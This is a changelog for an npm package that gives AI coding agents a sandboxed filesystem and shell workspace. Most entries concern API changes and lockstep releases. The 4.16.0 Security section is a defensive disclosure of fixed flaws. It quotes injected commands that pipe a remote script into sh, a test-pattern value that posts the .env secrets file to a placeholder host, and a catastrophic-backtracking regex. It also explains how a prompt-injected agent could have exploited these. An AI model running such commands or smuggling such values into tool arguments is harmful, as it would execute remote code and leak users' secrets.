# Changelog — @warlock.js/ai-workspace

All notable changes to `@warlock.js/ai-workspace` are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/). `@warlock.js/*` packages are released in lockstep — every package shares the same version number, so a version below may list only the changes that affected this package.

## 5.30.0 - 2026-10-16

### Upgrading

- `RunShellResult.cancelled` is now a required field: a custom `WorkspaceOps`/`Workspace` implementation or a test double that builds a `RunShellResult` must set it (`false` unless the command was cancelled).
- `Workspace.readFile()` and `WorkspaceOps.readFile()` now return `ReadFileResult` (adds `startLine`, `endLine`, `truncated`, `bytesCapped`, `totalBytes`); custom implementations must return those fields.
- A read window that starts past the end of the file now returns empty `content` instead of one numbered empty line.
- `read.maxBytes` now actually caps the returned `content`; a read that used to return a whole long file under a small cap now comes back cut, with `bytesCapped: true`.

### Added

- `exec()` takes a per-call `signal` (`ExecOptions`); `run_shell` and `run_tests` pass the agent run's `ctx.signal`. An already-aborted signal never starts the command; an abort mid-run kills the process tree. Both resolve with the new `cancelled: true` on `RunShellResult`, never together with `timedOut`.
- `WorkspaceBackendExecOptions.signal` and `WorkspaceBackendExecResult.cancelled?` for custom backends; the local backend removes its abort listener when the command settles, and the mock backend honours a pre-aborted signal.
- Read results carry `startLine`, `endLine`, `truncated`, `bytesCapped` and `totalBytes`; `readFile()` and the `read_file` tool now return the same `ReadFileResult` for the same arguments.

### Fixed

- `read.maxBytes` is enforced: the returned `content` (line-number prefixes and newlines included) never exceeds it, so a single long line no longer bypasses the cap. Lines are cut on a character boundary, never mid-character; `hash` remains the SHA-256 of the whole file.
- Command output clipped at `shell.maxOutputBytes` is cut on a character boundary instead of ending in a replacement character.
- A read window past the end of the file returns empty `content` instead of one numbered empty line.
- Writes, edits and removes of the same path are serialized, so two concurrent `edit_file` calls (the agent now dispatches a trip's tool calls concurrently) can no longer both pass the stale-hash guard and silently drop one edit; the second re-reads and is rejected as stale, or applies on top when it pinned no hash.
- Aborting a command after it has already exited (while its stdio is still draining) no longer reports it as `cancelled`; the tree is still reaped so the result settles.
- On Windows, a `taskkill` that cannot be started no longer crashes the process with an unhandled `'error'` event; the direct child is killed instead.

## 5.29.0 - 2026-10-01

### Changed

- Lockstep release; package APIs are unchanged. Skills refer to other topics by name instead of file paths, so cross-references keep working after `agent-kit` copies them into an app.

## 5.28.0 - 2026-10-01

### Changed

- Lockstep release; package APIs are unchanged. `llms.txt` now lists every skill topic with its description (frontmatter in CRLF files was skipped).

## 5.27.0 - 2026-10-01

### Changed

- Lockstep release; package APIs are unchanged.

## 5.26.0 - 2026-09-30

### Changed

- Lockstep release; package APIs are unchanged.

## 5.25.0 - 2026-09-28

### Changed

- Lockstep release; package APIs are unchanged.

## 5.24.0 - 2026-09-27

### Changed

- Lockstep release; package APIs are unchanged.

## 5.23.2 - 2026-09-26

### Changed

- Lockstep patch release; package APIs are unchanged.

## 5.23.1 - 2026-09-26

### Changed

- Lockstep patch release; package APIs are unchanged.

## 5.23.0 - 2026-09-25

### Changed

- Lockstep patch release; package APIs are unchanged.

## 5.22.1 - 2026-09-25

### Changed

- Lockstep patch release; package APIs are unchanged.

## 5.22.0 - 2026-09-25

### Changed

- Lockstep release maintenance and dependency refresh.

## 5.21.0 - 2026-09-25

### Changed

- Lockstep release maintenance and dependency refresh.
## 5.20.0 - 2026-09-24

### Changed

- Added a package-level skill index and clearer discovery descriptions for grouped agent guidance.

## 5.19.0 - 2026-09-23

### Changed

- Refined package skill-discovery descriptions and regenerated the llms projections.

## 5.11.0 - 2026-09-14

_Released in lockstep with the `@warlock.js/*` family; no package-specific changes in 5.11.0._

## 5.10.0 - 2026-09-14

_Released in lockstep with the `@warlock.js/*` family; no package-specific changes in 5.10.0._

## 5.9.0 - 2026-09-13

_Released in lockstep with the `@warlock.js/*` family; no package-specific changes in 5.9.0._

## 5.5.0 - 2026-09-07

### Fixed

- Documentation shipped in this package's `skills/` told users to run `pnpm`-specific commands. `pnpm <binary>` has no npm equivalent, so those instructions failed outright for anyone not using pnpm. Commands are now package-manager neutral.

## 5.2.3 - 2026-09-02

### Fixed

- Released in exact lockstep with Core's Web generator repairs so every family dependency remains installable at 5.2.3.

## 5.2.2

### Maintenance

- Restored the Warlock family to one exact, installable lockstep version.

## 5.1.0

No changes to `@warlock.js/ai-workspace`. Released in lockstep with the `@warlock.js/web`
React-execution fix and the `@warlock.js/core` CLI additions — see those packages'
changelogs.

## 5.0.2 - 2026-08-25

No changes to `@warlock.js/ai-workspace`. Released in lockstep with the `@warlock.js/web` SSR
fix (`ssr.noExternal`) — see that package's changelog.

## 5.0.1 - 2026-08-25

No changes to `@warlock.js/ai-workspace`. Released in lockstep with the `create-warlock` vite
resolution pin and the `@warlock.js/web` peer narrowing — see those packages'
changelogs.

## 5.0.0 - 2026-08-25

### Changed

- This package is unchanged in 5.0.0; its version moved only because the Warlock family releases in lockstep.

## 4.16.0 - 2026-08-18

### Security

- **Fixed a critical command-injection bypass of the shell allowlist.** Commands were spawned with `shell: true` while the allow/deny gate inspected only the leading executable token, so a command like `npm test; curl http://evil | sh` (or any `&&`, `|`, backtick, `$()`, or redirection chain) passed the gate and the shell executed the injected suffix — a prompt-injected agent could run arbitrary programs past a fail-closed allowlist. Commands are now tokenized into an argv with **no shell semantics** (quotes respected; unquoted metacharacters `;` `&` `|` `<` `>` `` ` `` `$` `(` `)` and newlines are rejected outright, by both `isCommandAllowed` and the local backend) and spawned with `shell: false`. On Windows, the argv runs through a `cmd.exe /d /s /c` wrapper with every element individually quoted (batch shims like `npm.cmd` cannot be spawned shell-less); arguments containing `"`, `%`, or newlines are refused there rather than risked (BatBadBut-class smuggling).
- **Fixed `run_tests` pattern injection.** The model-controlled `pattern` was concatenated verbatim into the shelled test command, giving a second, direct injection path (`{ pattern: "; curl http://evil -d @.env #" }`). The pattern is now forwarded as a single double-quoted token — one literal argv element to the runner — and patterns containing double quotes or newlines are rejected at input validation.
- Behavior note: shell conveniences (pipes, redirection, chaining, variable expansion) no longer work in `run_shell`/`exec` — commands run one argv at a time. Quoted metacharacters remain plain argument data.
- **Fixed a ReDoS / event-loop DoS in `grep`.** `Ops.grep` compiled a model-controlled pattern into a `RegExp` with no length cap and ran it synchronously, per line, over every scanned file — a pattern like `(a+)+$` against an ordinary line could hang the process for an attacker-controlled or prompt-injected duration. `grep` now rejects patterns over 200 characters and patterns matching a nested-quantifier heuristic (`(x+)+`, `(x*)*`, `(x+)*`, `(x*)+`-shaped groups) as a new `WorkspacePolicyError` (`type: "unsafe-pattern"`) before compiling the regex, and skips (rather than tests) any line longer than 2000 characters to bound the worst-case backtracking cost of any single call.

## 4.12.0

### Changed

- Declares its own test runner and pins it to an exact version (`vitest@4.1.10`). The package is its own repository, so a runner resolved from a workspace root it may not be cloned with is a runner it cannot rely on. The pin is exact rather than a range because the version moved underneath the suite mid-development on an unrelated install — a suite whose runner can change without anyone choosing it proves less than it appears to

## 4.5.0 - 2026-07-01

Initial release — the policy-jailed filesystem + shell workspace for `@warlock.js/ai` agents (the W1 surface).

### Added

- `ai.workspace(policy)` — the workspace verb, registered on the shared `ai` object via a `declare module "@warlock.js/ai"` augmentation + a runtime side-effect on import (no edit to `@warlock.js/ai`'s own source). Exported as the `workspace` factory; `WorkspaceCapableAi` is the typed view consumers cast `ai` through.
- **Policy jail** — every path is `realpath`-resolved and must sit under `cwd` (or an `allowPaths` root); `denyPaths` globs are blocked even inside `cwd`; the shell allow/deny list gates each command's leading executable basename (deny wins, fail-closed); per-command timeout + output byte cap; and `process.env` is never inherited wholesale (opt-in `shell.inheritEnv`, plus explicit `shell.env`).
- **Seven agent-facing tools** under `ws.tools.*`, each a `ToolContract` built on the core `tool()` factory: `read_file`, `edit_file`, `write_file`, `run_shell`, `run_tests`, `grep`, `glob`. Each factory takes an optional `{ name }` (and `run_tests` a `{ command }`) override.
- `tools.all()` — every tool in canonical order — and `tools.pick(...names)` — a least-privilege subset (e.g. `pick("readFile", "grep", "glob")` for a reviewer).
- **Direct programmatic methods** sharing the same policy seam: `readFile` / `writeFile` / `editFile` / `exec` / `grep` / `glob` / `exists` / `mkdir` / `remove`.
- `readonly()` — a projection that vends only the read/grep/glob tools and rejects every mutating direct method with a `WorkspacePolicyError`.
- `scope(subdir)` — a sub-jailed workspace rooted at `subdir` (narrowed `cwd`, same sub-policies and backend selection).
- **Read-before-edit guard** — `read_file` / `readFile` return a SHA-256 content `hash` (via `@warlock.js/fs` `hashString`); `edit_file` requires an exact, unique `oldString` (or `replaceAll`) and rejects a mismatched `expectHash` as stale.
- **Backends** — `createLocalBackend` (default `"local"`; `@warlock.js/fs` for IO + `node:child_process` for the shell) and `createMockBackend` (in-memory `Map` + scripted `exec`, for hermetic disk-free tests), behind the `WorkspaceBackend` contract.
- **Policy engine seam** exports: `resolveInJail`, `isCommandAllowed`, `buildEnv`, and the `ResolvedPath` type.
- **Ops layer** export `createOps` — the single policy-enforced operation layer both the tools and the direct methods funnel through.
- **Typed errors** `WorkspacePolicyError` (`type: "path-escape" | "denied-command"`) and `WorkspaceEditError` (`type: "not-found" | "not-unique" | "stale-hash"`), both extending the `@warlock.js/ai` `AIError` base (code `TOOL_EXEC_FAILED`) so failures surface to the agent as tool-error data, never thrown run-killers.
- **Public type surface** re-exported from the barrel: `Workspace`, `WorkspaceTools`, `WorkspacePolicy`, `WorkspaceShellPolicy`, `WorkspaceReadPolicy`, `WorkspaceBackendType`, `WorkspaceToolName`, `WorkspaceOps`, `WorkspaceBackend` (+ `WorkspaceBackendExecOptions` / `WorkspaceBackendExecResult`), and the per-tool IO shapes (`ReadFileInput`/`Result`, `EditFileInput`/`Result`, `WriteFileInput`/`Result`, `RunShellInput`/`Result`, `RunTestsInput`, `GrepInput`/`Match`/`Result`, `GlobInput`/`Result`).
- `scripts/generate-llms.mjs` and the generated `llms.txt` / `llms-full.txt` projections of `skills/`.
- `skills/use-a-workspace/SKILL.md` — building a jailed workspace and operating it (policy, the seven tools, the direct methods, `readonly` / `scope`).
- `skills/build-loop-agent/SKILL.md` — wiring `ws.tools.all()` into a coding agent that reads → edits → runs tests until green.
